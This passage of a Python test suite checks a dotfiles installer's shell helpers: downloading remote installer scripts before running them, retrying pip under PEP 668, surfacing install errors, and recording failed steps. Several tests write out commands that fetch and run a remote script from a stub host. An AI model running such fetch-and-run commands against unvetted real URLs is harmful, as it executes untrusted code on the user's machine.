            "a non-numeric DRY_RUN was accepted; the guards silently "
            f"fell through to the real branch\n{res.stdout}"
        )
        assert "DRY_RUN" in res.stderr, res.stderr
        assert list(shell_env.home.iterdir()) == [], list(shell_env.home.iterdir())


class TestFetchAndRun:
    """fetch_and_run downloads a remote installer in full before running it, so
    a truncated/empty download can't execute a partial script."""

    def test_runs_downloaded_script_and_cleans_up(self, shell_env):
        shell_env.stub("curl", body=_CURL_WRITES_SCRIPT)
        res = run_sourced("fetch_and_run https://example.test/x.sh bash", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "RAN tmp=" in res.stdout
        # With no `--`, the script receives no positional args.
        assert "args=[]" in res.stdout
        # The temp file must be removed after the run (no accumulation).
        m = re.search(r"RAN tmp=(\S+) args=", res.stdout)
        assert m, res.stdout
        assert not Path(m.group(1)).exists()

    def test_passes_positional_args_after_separator(self, shell_env):
        # `-- --unattended` must reach the SCRIPT as $1 (Oh My Zsh's flag),
        # not be consumed as an option to the interpreter.
        shell_env.stub("curl", body=_CURL_WRITES_SCRIPT)
        res = run_sourced(
            "fetch_and_run https://example.test/x.sh bash -- --unattended",
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "args=[--unattended]" in res.stdout

    def test_interpreter_flags_before_separator_stay_interpreter_side(self, shell_env):
        # Args before `--` are the interpreter's own flags and must land BEFORE
        # the script path. `sh -x <tmp>`
        # runs the script under xtrace -- an sh option -- so the script still runs
        # (marker on stdout) AND the trace on stderr proves `-x` was applied to
        # sh rather than passed to the script.
        shell_env.stub("curl", body=_CURL_WRITES_SCRIPT)
        res = run_sourced(
            "fetch_and_run https://example.test/x.sh sh -x",
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "RAN tmp=" in res.stdout  # script ran
        assert "+ echo" in res.stderr  # xtrace => -x reached sh, not the script

    def test_rejects_empty_download(self, shell_env):
        # A curl that succeeds but writes nothing (empty 200) must be refused,
        # never handed to a shell.
        shell_env.stub("curl")  # default body leaves the -o target empty
        res = run_sourced(
            "fetch_and_run https://example.test/x.sh bash "
            '&& echo OK || echo "FAILED rc=$?"',
            shell_env.env,
        )
        assert "Downloaded empty script" in res.stdout
        assert "FAILED rc=1" in res.stdout
        assert "RAN tmp=" not in res.stdout

    def test_download_failure_returns_nonzero(self, shell_env):
        shell_env.stub("curl", exit_code=1)
        res = run_sourced(
            "fetch_and_run https://example.test/x.sh bash "
            '&& echo OK || echo "FAILED rc=$?"',
            shell_env.env,
        )
        assert "Failed to download" in res.stdout
        assert "FAILED rc=1" in res.stdout


# A pip3 stub that reproduces PEP 668: a plain `--user` install aborts with
# the externally-managed guard, but the same install succeeds once
# `--break-system-packages` is present.
_PIP_PEP668_STUB = r"""
for a in "$@"; do
  if [ "$a" = "--break-system-packages" ]; then
    exit 0
  fi
done
if [ "$1" = "install" ]; then
  echo "error: externally-managed-environment" >&2
  echo "This environment is externally managed" >&2
  exit 1
fi
exit 0
"""

# A pip3 stub whose install always fails for a non-PEP-668 reason (bad package
# / no network), so the retry must NOT trigger and the reason must surface.
_PIP_HARD_FAIL_STUB = r"""
if [ "$1" = "install" ]; then
  echo "ERROR: Could not find a version that satisfies boguspkg" >&2
  echo "ERROR: No matching distribution found for boguspkg" >&2
  exit 1
fi
exit 0
"""


class TestPipInstallUser:
    """pip_install_user survives PEP 668 and surfaces real failures instead
    of a bare `pip install --user ... 2>/dev/null` (which both fails on
    externally-managed Python and hides the reason)."""

    def test_plain_user_install_is_not_broken_for_managed_flag(self, shell_env):
        # Happy path: a healthy pip needs no --break-system-packages, and the
        # override must not be applied speculatively (older pip rejects it).
        shell_env.stub("pip3")  # default body: log call, exit 0
        res = run_sourced("pip_install_user pip3 somepkg", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "pip3 install --user somepkg" in shell_env.calls
        assert not any("--break-system-packages" in c for c in shell_env.calls)
        assert "Failed to install" not in res.stdout

    def test_pep668_triggers_break_system_packages_retry(self, shell_env):
        # externally-managed guard -> retry into the user site with the
        # override, and succeed without warning.
        shell_env.stub("pip3", body=_PIP_PEP668_STUB)
        res = run_sourced("pip_install_user pip3 mypkg", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert any(
            "install --user --break-system-packages mypkg" in c for c in shell_env.calls
        ), shell_env.calls
        assert "externally managed" in res.stdout
        assert "Failed to install" not in res.stdout

    def test_non_pep668_failure_surfaces_reason_and_does_not_retry(self, shell_env):
        # The whole point of dropping `2>/dev/null`: a genuine failure must
        # report pip's reason, and must NOT be retried with the override
        # (there is no externally-managed marker to justify it).
        shell_env.stub("pip3", body=_PIP_HARD_FAIL_STUB)
        res = run_sourced("pip_install_user pip3 boguspkg", shell_env.env)
        assert res.returncode == 0, res.stderr  # non-fatal by contract
        assert "Failed to install boguspkg" in res.stdout
        assert "No matching distribution found for boguspkg" in res.stdout
        assert not any("--break-system-packages" in c for c in shell_env.calls)
        # exactly one install attempt (no retry)
        assert sum(c.startswith("pip3 install") for c in shell_env.calls) == 1

    def test_hard_failure_records_the_package(self, shell_env):
        shell_env.stub("pip3", body=_PIP_HARD_FAIL_STUB)
        res, failures = run_recording("pip_install_user pip3 boguspkg", shell_env.env)
        assert res.returncode == 0, res.stderr  # still non-fatal
        assert failures == ["boguspkg"]

    def test_plain_success_records_nothing(self, shell_env):
        shell_env.stub("pip3")
        res, failures = run_recording("pip_install_user pip3 somepkg", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert failures == []

    def test_pep668_retry_that_succeeds_records_nothing(self, shell_env):
        shell_env.stub("pip3", body=_PIP_PEP668_STUB)
        res, failures = run_recording("pip_install_user pip3 mypkg", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert any("--break-system-packages mypkg" in c for c in shell_env.calls)
        assert failures == []

    def test_pep668_retry_that_also_fails_records_the_package_once(self, shell_env):
        # First call reports the managed-environment guard, the retry then
        # fails for a real reason: one failed step, one entry.
        body = (
            'case "$*" in\n'
            '  *--break-system-packages*) echo "ERROR: no matching dist" >&2; exit 1 ;;\n'
            "esac\n"
            'echo "error: externally-managed-environment" >&2\n'
            "exit 1\n"
        )
        shell_env.stub("pip3", body=body)
        res, failures = run_recording("pip_install_user pip3 mypkg", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert failures == ["mypkg"]

    def test_mcp_deps_install_routes_through_helper_under_pep668(self, shell_env):
        # The real caller (install_mcp_server_deps) must reach the PEP 668
        # recovery: `pip show` reports mcp absent, then the install succeeds
        # only via the override.
        body = 'if [ "$1" = "show" ]; then exit 1; fi\n' + _PIP_PEP668_STUB
        shell_env.stub("pip3", body=body)
        res = run_sourced("install_mcp_server_deps", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert any(
            "install --user --break-system-packages mcp" in c for c in shell_env.calls
        ), shell_env.calls
        assert "Failed to install mcp" not in res.stdout

    def test_source_has_no_stderr_swallowing_user_install(self):
        # Source guard: no raw `pip install --user ... 2>/dev/null` may
        # remain, both --user sites must route through the helper, and the
        # PEP 668 remedy must be present.
        text = INSTALL.read_text(encoding="utf-8")
        assert not re.search(r"install --user.*2>/dev/null", text)
        assert "pip_install_user()" in text
        assert text.count('pip_install_user "$pip_cmd"') == 2
        assert "--break-system-packages" in text
        assert "externally-managed-environment" in text


class TestRecordFailureHelpers:
    """The bookkeeping itself: a global list, an append that can never abort a
    bare caller under `set -e`, and the end-of-run summary."""

    def test_the_list_starts_empty(self, shell_env):
        res, failures = run_recording(":", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert failures == []

    def test_record_failure_appends_in_order(self, shell_env):
        res, failures = run_recording(
            'record_failure alpha; record_failure "beta gamma"', shell_env.env
        )
        assert res.returncode == 0, res.stderr
        assert failures == ["alpha", "beta gamma"]

    def test_an_identical_consecutive_label_is_recorded_once(self, shell_env):
        # The same failure path reporting itself twice must read as one step.
        res, failures = run_recording(
            'record_failure alpha; record_failure alpha; echo "AFTER_DUPLICATE"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_DUPLICATE" in res.stdout  # the skip path returns 0 too
        assert failures == ["alpha"]

    def test_the_same_label_separated_by_another_step_is_kept(self, shell_env):
        # Independent failures may legitimately share a label.
        res, failures = run_recording(
            "record_failure alpha; record_failure beta; record_failure alpha",
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert failures == ["alpha", "beta", "alpha"]

    def test_record_failure_never_aborts_a_bare_caller(self, shell_env):
        res = run_sourced(
            'record_failure alpha; echo "AFTER_RECORD"; '
            'record_failure alpha; echo "AFTER_SKIP"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_RECORD" in res.stdout
        assert "AFTER_SKIP" in res.stdout

    def test_report_lists_every_label_under_a_count(self, shell_env):
        res = run_sourced(
            'INSTALL_FAILURES=(alpha "beta gamma"); report_install_failures; '
            'echo "AFTER_REPORT"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        out = res.stdout
        assert "[ERROR]" in out
        assert "Installation finished with 2 failed step(s):" in out
        assert out.index("  - alpha\n") < out.index("  - beta gamma\n")
        assert "Reasons are printed above as [WARNING]" in out
        assert "re-run ./install.sh" in out
        assert "AFTER_REPORT" in out

    def test_report_is_silent_when_nothing_failed(self, shell_env):
        res = run_sourced("report_install_failures", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert res.stdout == ""


class TestTryInstall:
    """try_install runs a tool-install command quietly on success but surfaces
    the installer's own error on failure, instead of the repeated
    `<installer> ... 2>/dev/null || print_warning "Failed to install X"`
    pattern across every package manager."""

    def test_success_is_quiet_and_logged(self, shell_env):
        shell_env.stub("faketool")  # default body: log call, exit 0
        res = run_sourced("try_install widget faketool install widget", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "faketool install widget" in shell_env.calls
        assert "Failed to install" not in res.stdout

    def test_failure_surfaces_the_installers_reason(self, shell_env):
        shell_env.stub(
            "faketool", body='echo "E: could not reach the registry" >&2\nexit 1'
        )
        res = run_sourced("try_install widget faketool install widget", shell_env.env)
        assert res.returncode == 0, res.stderr  # non-fatal by contract
        assert "Failed to install widget" in res.stdout
        assert "could not reach the registry" in res.stdout

    def test_installer_stdout_progress_is_suppressed_on_success(self, shell_env):
        # npm/go/gem progress noise must not leak on the happy path.
        shell_env.stub("faketool", body='echo "downloading 100%"')
        res = run_sourced("try_install widget faketool install widget", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "downloading 100%" not in res.stdout

    def test_failure_records_exactly_its_label(self, shell_env):
        shell_env.stub("faketool", body='echo "E: nope" >&2\nexit 1')
        res, failures = run_recording(
            "try_install widget faketool install widget", shell_env.env
        )
        assert res.returncode == 0, res.stderr  # still non-fatal
        assert failures == ["widget"]

    def test_success_records_nothing(self, shell_env):
        shell_env.stub("faketool")
        res, failures = run_recording(
            "try_install widget faketool install widget", shell_env.env
        )
        assert res.returncode == 0, res.stderr
        assert failures == []

    def test_a_label_with_spaces_and_quotes_is_recorded_verbatim(self, shell_env):
        shell_env.stub("faketool", exit_code=1)
        res, failures = run_recording(
            "try_install \"Docker 'Desktop' (cask)\" faketool install x",
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert failures == ["Docker 'Desktop' (cask)"]

    def test_failures_accumulate_in_call_order(self, shell_env):
        shell_env.stub("faketool", exit_code=1)
        res, failures = run_recording(
            "try_install first faketool a; try_install second faketool b",
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert failures == ["first", "second"]

    def test_tree_sitter_install_surfaces_brew_failure(self, shell_env):
        # A real caller (install_tree_sitter_cli) must report why brew failed
        # instead of a bare "Failed to install tree-sitter CLI".
        shell_env.stub("brew", body='echo "Error: 403 Forbidden" >&2\nexit 1')
        res = run_sourced(
            'command_exists() { case "$1" in tree-sitter) return 1 ;; '
            '*) command -v "$1" >/dev/null 2>&1 ;; esac; }; '
            "OS=macos install_tree_sitter_cli",
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "Failed to install tree-sitter CLI" in res.stdout
        assert "403 Forbidden" in res.stdout

    def test_mutating_installs_no_longer_swallow_stderr(self):
        # The sweep: every mutating install routes through try_install; none
        # may keep `2>/dev/null`. Existence probes are deliberately left alone.
        text = INSTALL.read_text(encoding="utf-8")
        assert "try_install()" in text
        swallowing_mutations = [
            r"npm install -g[^\n]*2>/dev/null",
            r"\bgo install\b[^\n]*2>/dev/null",
            r"\bgem install\b[^\n]*2>/dev/null",
            r"\bbrew install\b[^\n]*2>/dev/null",
            r"composer global require[^\n]*2>/dev/null",
            r"scoop install[^\n]*2>/dev/null",
            r"snap install[^\n]*2>/dev/null",
        ]
        for pat in swallowing_mutations:
            assert not re.search(pat, text), f"still swallowing stderr: {pat}"
        # Unified: no package-manager install pairs directly with a
        # print_warning fallback -- they all route through try_install,
        # including the line-wrapped nodejs apt install.
        assert not re.search(r"brew install[^\n]*\|\| print_warning", text)
        assert not re.search(r"apt-get install -y [^\n|]*\|\|", text)
        # Probes must still discard output -- they only care about exit status.
        assert re.search(r"brew list [^\n]*&>/dev/null", text)
        assert re.search(r"npm list -g[^\n]*&>/dev/null", text)
        assert re.search(r"show mcp &>/dev/null", text)
        # fetch_and_run bootstraps (uv/pyenv/lazydocker) intentionally keep their
        # own error handling -- they stream stderr for supply-chain visibility
        # and must NOT be captured by try_install.
        assert re.search(r"fetch_and_run https://astral\.sh/uv", text)
        assert text.count("try_install ") >= 30


def _absent(*names: str) -> str:
    """Snippet prefix: `command_exists` reports each of `names` as missing.

    The dev machine (and CI image) may really have uv, pyenv, docker, node, gh
    on PATH; without this the "already installed" branch is taken and a test
    premised on a failed install passes vacuously.
    """
    pattern = "|".join(names)
    return (
        f'command_exists() {{ case "$1" in {pattern}) return 1 ;; '
        '*) command -v "$1" >/dev/null 2>&1 ;; esac; }; '
    )


def _fails_on(*patterns: str) -> str:
    """Stub body that exits 1 when "$*" matches any of the shell globs."""
    return f'case "$*" in {"|".join(patterns)}) exit 1 ;; esac'


_APT_INSTALL = '*"apt-get install"*'
_APT_UPDATE = '*"apt-get update"*'
# Stub prefix: `sudo tee ...` drains stdin like the real tee. A stub that exits
# without reading lets the writer of `echo ... | sudo tee` die of SIGPIPE, and
# under pipefail that reads as a failed tee -- a race the gh repository line
# (whose echo first runs $(dpkg ...)) loses every time.
_DRAIN_TEE = 'case "$*" in "tee "*) cat >/dev/null ;; esac\n'
_NOT_YET_INSTALLED = 'case "$*" in "list "*) exit 1 ;; esac'


class TestInstallFailureRecording:
    """Each install step that FAILS leaves exactly one entry in
    INSTALL_FAILURES; skips and steps whose outcome a later step reports leave
    none. main() turns the list into the end-of-run summary and exit status.

    The positive cases force the "missing" premise (see _absent) and the
    negative cases assert the skip's own warning appeared, so an early return
    cannot make "nothing recorded" pass by never reaching the branch.
    """

    # --- steps that fail: exactly one entry --------------------------------

    @pytest.mark.parametrize(
        ("stubs", "snippet", "expected", "also_in_stdout"),
        [
            pytest.param(
                {},
                _absent("brew") + "fetch_and_run() { return 1; }; "
                "OS=macos install_os_packages",
                ["Homebrew"],
                ["Homebrew bootstrap failed"],
                id="homebrew-bootstrap-skips-the-brew-packages-with-one-entry",
            ),
            pytest.param(
                {"sudo": _fails_on(_APT_INSTALL)},
                "OS=ubuntu install_apt_packages",
                ["APT packages"],
                ["Some APT packages failed"],
                id="apt-package-batch",
            ),
            pytest.param(
                {"brew": _fails_on('"list "*', '"install neovim"')},
                "install_brew_packages",
                ["neovim"],
                ["Failed to install neovim"],
                id="brew-package-through-try_install",
            ),
            pytest.param(
                {"curl": "exit 1", "sudo": ""},
                _absent("wezterm") + "OS=ubuntu install_wezterm",
                ["WezTerm"],
                ["Failed to fetch WezTerm GPG key"],
                id="wezterm-gpg-key",
            ),
            pytest.param(
                {"curl": "", "sudo": _fails_on(_APT_INSTALL)},
                _absent("wezterm") + "OS=ubuntu install_wezterm",
                ["WezTerm"],
                [],
                id="wezterm-key-ok-apt-install-fails",
            ),
            pytest.param(
                {"curl": "", "sudo": _fails_on("*tee*", _APT_INSTALL)},
                _absent("wezterm") + "OS=ubuntu install_wezterm",
                ["WezTerm"],
                ["Failed to add WezTerm apt repository"],
                id="wezterm-repo-add-and-install-both-fail-is-one-entry",
            ),
            pytest.param(
                {"curl": "", "sudo": _fails_on("*tee*")},
                _absent("wezterm") + "OS=ubuntu install_wezterm",
                ["WezTerm"],
                ["Failed to add WezTerm apt repository"],
                id="wezterm-repo-add-fails-but-apt-install-succeeds",
            ),
            pytest.param(
                {"brew": _fails_on('"list "*', '"install --cask wezterm"')},
                "OS=macos install_wezterm",
                ["WezTerm"],
                [],
                id="wezterm-macos-cask",
            ),
            pytest.param(
                {"brew": _fails_on("*font-ubuntu-mono*")},
                "OS=macos install_fonts",
                ["font-ubuntu-mono"],
                ["Failed to install font-ubuntu-mono"],
                id="font-cask-first-only",
            ),
            pytest.param(
                {"brew": _fails_on("*font-hack-nerd-font*")},
                "OS=macos install_fonts",
                ["font-hack-nerd-font"],
                [],
                id="font-cask-second-only",
            ),
            pytest.param(
                {"brew": "exit 1"},
                "OS=macos install_fonts",
                ["font-ubuntu-mono", "font-hack-nerd-font"],
                [],
                id="font-casks-both-in-order",
            ),
            pytest.param(
                {"sudo": "exit 1"},
                "OS=ubuntu install_fonts",
                ["fonts-ubuntu fonts-hack"],
                ["Failed to install fonts"],
                id="apt-fonts",
            ),
            pytest.param(
                {"curl": "exit 1", "sudo": "", "dpkg": "echo amd64"},
                _absent("gh") + "OS=ubuntu install_gh",
                ["gh"],
                ["Failed to fetch gh keyring"],
                id="gh-keyring-download",
            ),
            pytest.param(
                {
                    "curl": "",
                    "sudo": _DRAIN_TEE + _fails_on(_APT_INSTALL),
                    "dpkg": "echo amd64",
                },
                _absent("gh") + "OS=ubuntu install_gh",
                ["gh"],
                [],
                id="gh-keyring-ok-apt-install-fails-is-one-entry",
            ),
            # Same rule as WezTerm: a half-written apt source is a failure the
            # user must know about even when `apt-get install gh` then works
            # (e.g. from the distro's own, older package).
            pytest.param(
                {"curl": "", "sudo": _fails_on("*tee*"), "dpkg": "echo amd64"},
                _absent("gh") + "OS=ubuntu install_gh",
                ["gh"],
                ["Failed to add gh apt repository"],
                id="gh-repo-add-fails-but-apt-install-succeeds",
            ),
            pytest.param(
                {
                    "curl": "",
                    "sudo": _DRAIN_TEE + _fails_on("chmod*"),
                    "dpkg": "echo amd64",
                },
                _absent("gh") + "OS=ubuntu install_gh",
                ["gh"],
                ["Failed to chmod gh keyring"],
                id="gh-keyring-chmod-fails-but-apt-install-succeeds",
            ),
            pytest.param(
                {
                    "curl": "",
                    "sudo": _fails_on("*tee*", _APT_INSTALL),
                    "dpkg": "echo amd64",
                },
                _absent("gh") + "OS=ubuntu install_gh",
                ["gh"],
                ["Failed to add gh apt repository"],
                id="gh-repo-add-and-install-both-fail-is-one-entry",
            ),
            pytest.param(
                {"brew": "exit 1"},
                _absent("gh") + "OS=macos install_gh",
                ["gh"],
                [],
                id="gh-macos-brew",
            ),
            pytest.param(
                {},
                _absent("uv") + "fetch_and_run() { return 1; }; install_uv",
                ["uv"],
                ["Failed to install uv"],
                id="uv",
            ),
            pytest.param(
                {},
                _absent("pyenv")
                + "fetch_and_run() { return 1; }; OS=ubuntu install_pyenv",
                ["pyenv"],
                ["Failed to install pyenv"],
                id="pyenv-ubuntu",
            ),
            pytest.param(
                {},
                _absent("lazydocker")
                + "fetch_and_run() { return 1; }; OS=ubuntu install_lazydocker",
                ["lazydocker"],
                ["Failed to install lazydocker"],
                id="lazydocker-ubuntu",
            ),
            pytest.param(
                {"brew": "exit 1"},
                _absent("lazydocker") + "OS=macos install_lazydocker",
                ["lazydocker"],
                [],
                id="lazydocker-macos-brew",
            ),
            pytest.param(
                # gpg is stubbed so the step reaches the download on every machine:
                # without gpg the "gpg is not installed" check comes first
                {
                    "curl": "exit 22",
                    "sudo": _DRAIN_TEE,
                    "dpkg": "echo amd64",
                    "gpg": _gpg_shows(_pin("DOCKER_APT_KEY_FPR")),
                },
                _absent("docker") + _UBUNTU_NOBLE + "OS=ubuntu install_docker",
                ["Docker engine"],
                ["Failed to fetch the Docker signing key"],
                id="docker-engine-ubuntu-key-download",
            ),
            pytest.param(
                {
                    "curl": "",
                    "sudo": _DRAIN_TEE + _fails_on(_APT_INSTALL),
                    "dpkg": "echo amd64",
                    "gpg": _gpg_shows(_pin("DOCKER_APT_KEY_FPR")),
                },
                _absent("docker") + _UBUNTU_NOBLE + "OS=ubuntu install_docker",
                ["Docker engine"],
                ["Failed to install Docker engine"],
                id="docker-engine-ubuntu-repo-ok-apt-install-fails-is-one-entry",
            ),
            pytest.param(
                {"brew": "exit 1"},
                _absent("docker") + _DD_ABSENT + "OS=macos install_docker",
                ["Docker Desktop"],
                [],
                id="docker-desktop-macos",
            ),
            pytest.param(
                # gpg stubbed for the same reason as the Docker key download above
                {
                    "curl": "exit 22",
                    "sudo": _DRAIN_TEE,
                    "gpg": _gpg_shows(_pin("NODESOURCE_APT_KEY_FPR")),
                },
                _absent("node", "npm") + "OS=ubuntu install_nodejs",
                ["Node.js"],
                [
                    "Failed to fetch the NodeSource signing key",
                    "NodeSource setup failed",
                ],
                id="nodesource-setup",
            ),
            pytest.param(
                {
                    "curl": "",
                    "sudo": _DRAIN_TEE + _fails_on(_APT_INSTALL),
                    "gpg": _gpg_shows(_pin("NODESOURCE_APT_KEY_FPR")),
                },
                _absent("node", "npm") + "OS=ubuntu install_nodejs",
                ["Node.js"],
                [],
                id="nodesource-ok-apt-install-fails-is-one-entry",
            ),
            pytest.param(
                {},
                "fetch_and_run() { return 1; }; "
                "install_oh_my_zsh; link_oh_my_zsh_theme",
                ["Oh My Zsh"],
                [
                    "Failed to install Oh My Zsh",
                    "skipping the zsh plugins",
                    "Skipping the Oh My Zsh theme link",
                ],
                id="oh-my-zsh-fetch-is-one-entry-not-three",
            ),
            pytest.param(
                {"pip3": 'case "$1" in show) exit 1 ;; esac\nexit 1'},
                "install_mcp_server_deps",
                # The label is the spec pip was given: the pinned version.
                [f"mcp=={_pin('MCP_PY_VERSION')}"],
                ["Failed to install mcp"],
                id="pip-package-through-pip_install_user",
            ),
        ],
    )
    def test_failed_step_records_one_entry(
        self, shell_env, stubs, snippet, expected, also_in_stdout
    ):
        for name, body in stubs.items():
            shell_env.stub(name, body=body)
        res, failures = run_recording(snippet, shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == expected, res.stdout
        for text in also_in_stdout:
            assert text in res.stdout, (text, res.stdout)

    def _omz_installed(self, home):
        omz = home / ".oh-my-zsh"
        omz.mkdir(exist_ok=True)
        (omz / "oh-my-zsh.sh").write_text("# stub entry point\n", encoding="utf-8")

    def test_each_failed_zsh_plugin_clone_is_recorded_by_name(self, shell_env):
        self._omz_installed(shell_env.home)
        shell_env.stub("git", exit_code=1)
        res, failures = run_recording("install_oh_my_zsh", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == ["zsh-autosuggestions", "zsh-syntax-highlighting"]

    def test_only_the_failing_zsh_plugin_clone_is_recorded(self, shell_env):
        self._omz_installed(shell_env.home)
        shell_env.stub("git", body=_fails_on("*zsh-syntax-highlighting*"))
        res, failures = run_recording("install_oh_my_zsh", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == ["zsh-syntax-highlighting"]

    def test_a_failed_tpm_clone_is_recorded(self, shell_env):
        shell_env.stub("git", exit_code=1)
        res, failures = run_recording("install_tmux_plugins", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == ["tpm"]

    def test_a_failed_vim_plug_download_is_recorded(self, shell_env):
        shell_env.stub("curl", body=_CURL_TRUNCATED)
        res, failures = run_recording("install_vim_plug", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == ["vim-plug"]

    def test_a_vim_plug_that_is_already_there_records_nothing(self, shell_env):
        plug = shell_env.home / ".vim/autoload/plug.vim"
        plug.parent.mkdir(parents=True)
        plug.write_text('" already here\n', encoding="utf-8")
        shell_env.stub("curl", exit_code=1)
        res, failures = run_recording("install_vim_plug", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == []

    def test_a_failed_plug_install_is_recorded(self, shell_env):
        shell_env.stub("vim", exit_code=1)
        res, failures = run_recording("install_vim_plugins", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert "vim +PlugInstall failed" in res.stdout
        assert failures == ["vim +PlugInstall"]

    def test_a_successful_plug_install_records_nothing(self, shell_env):
        shell_env.stub("vim")
        res, failures = run_recording("install_vim_plugins", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert "Vim plugins installed" in res.stdout
        assert failures == []

    @pytest.mark.parametrize(
        ("add_fails_for", "expected"),
        [
            ("serena", ["MCP server serena"]),
            (
                "context7|serena|gemini-consultant",
                [
                    "MCP server context7",
                    "MCP server serena",
                    "MCP server gemini-consultant",
                ],
            ),
        ],
    )
    def test_a_failed_mcp_registration_is_recorded_per_server(
        self, shell_env, add_fails_for, expected
    ):
        # `mcp get` fails so add_mcp proceeds to `mcp add`, which fails for the
        # named servers only.
        shell_env.stub(
            "claude",
            body=(
                'if [ "$1 $2" = "mcp get" ]; then exit 1; fi\n'
                f'case "$5" in {add_fails_for}) exit 1 ;; esac'
            ),
        )
        shell_env.stub("python3")
        res, failures = run_recording("register_claude_mcp_servers", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == expected

    def test_a_chsh_that_ran_and_failed_is_recorded(self, shell_env):
        shell_env.stub("zsh")
        shell_env.stub("chsh", exit_code=1)
        env = {**shell_env.env, "SHELL": "/bin/bash"}
        res, failures = run_recording("change_shell", env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert "chsh failed" in res.stdout
        assert failures == ["chsh"]

    def test_a_chsh_that_succeeds_records_nothing(self, shell_env):
        shell_env.stub("zsh")
        env = {**shell_env.env, "SHELL": "/bin/bash"}
        res, failures = run_recording("change_shell", env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert "Default shell changed to zsh" in res.stdout
        assert failures == []

    # --- reclaim_aborted_clone ---------------------------------------------

    TPM = ".tmux/plugins/tpm"

    def _interrupted_clone(self, path: Path) -> Path:
        (path / ".git" / "objects").mkdir(parents=True)
        (path / ".git" / "config").write_text("[core]\n", encoding="utf-8")
        return path

    def test_a_cleanup_that_really_fails_is_recorded_once(self, shell_env):
        # Shadowing `rm` is root-safe (a chmod-based failure is not).
        shell_env.stub("git", body=_GIT_CLONE_STUB)
        self._interrupted_clone(shell_env.home / self.TPM)
        res, failures = run_recording(
            "rm() { return 1; }; install_tmux_plugins", shell_env.env
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert "Could not remove" in res.stdout
        assert failures == ["tpm"]
        assert not [c for c in shell_env.calls if c.startswith("git clone")]

    def test_a_repair_that_works_records_nothing(self, shell_env):
        shell_env.stub("git", body=_GIT_CLONE_STUB)
        self._interrupted_clone(shell_env.home / self.TPM)
        res, failures = run_recording("install_tmux_plugins", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert (shell_env.home / self.TPM / "tpm").is_file()
        assert failures == []

    def test_a_refusal_that_leaves_the_plugin_uninstalled_is_recorded(self, shell_env):
        # Populated beyond an interrupted clone: reported, never deleted, and
        # tpm stays missing -- so the run must not end as a success.
        shell_env.stub("git", body=_GIT_CLONE_STUB)
        target = self._interrupted_clone(shell_env.home / self.TPM)
        (target / "notes.txt").write_text("mine\n", encoding="utf-8")
        res, failures = run_recording("install_tmux_plugins", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert "looks incomplete" in res.stdout
        assert (target / "notes.txt").is_file()
        assert failures == ["tpm"]

    def test_a_symlinked_target_refusal_is_recorded(self, shell_env, tmp_path):
        shell_env.stub("git", body=_GIT_CLONE_STUB)
        elsewhere = self._interrupted_clone(tmp_path / "my-own-tpm")
        (shell_env.home / ".tmux/plugins").mkdir(parents=True)
        (shell_env.home / self.TPM).symlink_to(elsewhere)
        res, failures = run_recording("install_tmux_plugins", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert "not a plain directory" in res.stdout
        assert failures == ["tpm"]

    def test_a_target_outside_home_refusal_is_recorded(self, shell_env, tmp_path):
        outside = self._interrupted_clone(tmp_path / "outside-home")
        res, failures = run_recording(
            f'reclaim_aborted_clone "{outside}" demo || true', shell_env.env
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert "Refusing to reclaim demo" in res.stdout
        assert failures == ["demo"]

    def test_the_dry_run_decline_is_not_a_failure(self, shell_env):
        shell_env.stub("git", body=_GIT_CLONE_STUB)
        self._interrupted_clone(shell_env.home / self.TPM)
        res, failures = run_recording("DRY_RUN=1 install_tmux_plugins", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert "[DRY-RUN] would remove the interrupted clone" in res.stdout
        assert failures == []

    # --- skips and steps whose outcome a later step reports: no entry --------

    @pytest.mark.parametrize(
        ("stubs", "snippet", "warning"),
        [
            pytest.param(
                {"curl": "exit 1"},
                "fetch_and_run https://example.invalid/x.sh sh || true",
                "Failed to download",
                id="fetch_and_run-download-failure-the-caller-records",
            ),
            pytest.param(
                {"curl": ""},
                "fetch_and_run https://example.invalid/x.sh sh || true",
                "Downloaded empty script",
                id="fetch_and_run-empty-script-the-caller-records",
            ),
            pytest.param(
                {"sudo": _fails_on(_APT_UPDATE)},
                "OS=ubuntu install_apt_packages",
                "apt-get update failed (continuing)",
                id="apt-get-update-in-apt-packages",
            ),
            pytest.param(
                {"curl": "", "sudo": _fails_on(_APT_UPDATE)},
                _absent("wezterm") + "OS=ubuntu install_wezterm",
                "apt-get update failed",
